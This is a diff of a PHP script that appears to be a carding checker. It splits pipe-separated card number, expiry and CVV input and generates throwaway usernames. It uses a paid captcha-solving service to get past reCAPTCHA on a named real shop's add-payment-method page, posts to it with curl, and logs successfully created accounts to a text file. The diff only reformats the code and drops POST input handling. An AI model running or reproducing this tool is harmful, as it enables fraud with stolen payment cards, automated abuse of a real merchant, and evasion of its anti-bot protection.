@@ -1,67 +1,58 @@
 <?php
-error_reporting(0); 
+	error_reporting(0); 
 
-include("anticaptcha.php");
-include("nocaptchaproxyless.php");
+	include("anticaptcha.php");
+	include("nocaptchaproxyless.php");
 
-if($_SERVER['REQUEST_METHOD'] == 'POST'){ 
-    extract($_POST); 
-} 
-else { 
-   extract($_GET); 
-} 
- 
-function GetStr($string, $start, $end){ 
-    $str = explode($start, $string); 
-    $str = explode($end, $str[1]); 
-    return $str[0]; 
-} 
+	function GetStr($string, $start, $end){ 
+	    $str = explode($start, $string); 
+	    $str = explode($end, $str[1]); 
+	    return $str[0]; 
+	} 
 
-function RandomString($length = 5)
-{
-    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
-    $charactersLength = strlen($characters);
-    $randomString     = '';
-    for ($i = 0; $i < $length; $i++) {
-        $randomString .= $characters[rand(0, $charactersLength - 1)];
-    }
-    return $randomString;
-}
- 
-$separator = explode("|", $lista);  
-$cc = $separator[0]; 
-$mm = $separator[1]; 
-$yy = $separator[2]; 
-$cvv = $separator[3];
-$username = RandomString().mt_rand(1, 999);
-$postcode = mt_rand(10080, 94545);
+	function RandomString($length = 5)
+	{
+	    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+	    $charactersLength = strlen($characters);
+	    $randomString     = '';
+	    for ($i = 0; $i < $length; $i++) {
+		$randomString .= $characters[rand(0, $charactersLength - 1)];
+	    }
+	    return $randomString;
+	}
 
-$api = new NoCaptchaProxyless();
-$api->setVerboseMode(true);
-        
-//your anti-captcha.com account key
-$api->setKey("YOUR API KEY HERE");
+	extract($_GET); 
+	$separator = explode("|", $lista);  
+	$cc = $separator[0]; 
+	$mm = $separator[1]; 
+	$yy = $separator[2]; 
+	$cvv = $separator[3];
+	$username = RandomString().mt_rand(1, 999);
+	$postcode = mt_rand(10080, 94545);
 
-//target website address
-$api->setWebsiteURL("https://sonuscore.com/my-account/add-payment-method/");
+	$api = new NoCaptchaProxyless();
+	$api->setVerboseMode(true);
 
-//recaptcha key from target website
-$api->setWebsiteKey("6LcrjhIUAAAAAFXOoKRUNfwEVAbRqi-pYqY0mDRE");
+	//your anti-captcha.com account key
+	$api->setKey("YOUR API KEY HERE");
+	$api->setWebsiteURL("https://sonuscore.com/my-account/add-payment-method/");
+	//recaptcha key
+	$api->setWebsiteKey("6LcrjhIUAAAAAFXOoKRUNfwEVAbRqi-pYqY0mDRE");
 
-//create task in API
-if (!$api->createTask()) {
-    $api->debout("API v2 send failed - ".$api->getErrorMessage(), "red");
-    return false;
-}
+	//create task in API
+	if (!$api->createTask()) {
+	    $api->debout("API v2 send failed - ".$api->getErrorMessage(), "red");
+	    return false;
+	}
 
-$taskId = $api->getTaskId();
+	$taskId = $api->getTaskId();
 
-//wait in a loop for max 300 seconds till task is solved
-if (!$api->waitForResult(300)) {
-    echo "could not solve captcha\n";
-} else {
-    $gResponse    =   $api->getTaskSolution();
-}
+	//wait in a loop for max 300 seconds till task is solved
+	if (!$api->waitForResult(300)) {
+	    echo "could not solve captcha\n";
+	} else {
+	    $gResponse    =   $api->getTaskSolution();
+	}
 
 
     $ch = curl_init();
@@ -122,16 +113,16 @@ curl_setopt_array($ch, array(
 ));
     $execute = curl_exec($ch);
 
-if(strpos($execute, 'Address changed successfully')){ 
-    
-    echo '<tr><td><span class="badge badge-outline-danger badge-pill">Success</span></td></tr><br>'; 
-    fwrite(fopen("sonuscore.com_accounts.txt", "a"), $username."@gmail.com:".$username."\r\n");
-    
-}
-else { 
-    
-	echo '<tr><td><span class="badge badge-outline-danger badge-pill">Not Success</span></td></tr><br>'; 
-    
-}
-unlink("$username.txt");
+	if(strpos($execute, 'Address changed successfully')){ 
+
+	    echo '<tr><td><span class="badge badge-outline-danger badge-pill">Success</span></td></tr><br>'; 
+	    fwrite(fopen("sonuscore.com_accounts.txt", "a"), $username."@gmail.com:".$username."\r\n");
+
+	}
+	else { 
+
+		echo '<tr><td><span class="badge badge-outline-danger badge-pill">Not Success</span></td></tr><br>'; 
+
+	}
+	unlink("$username.txt");
 ?>
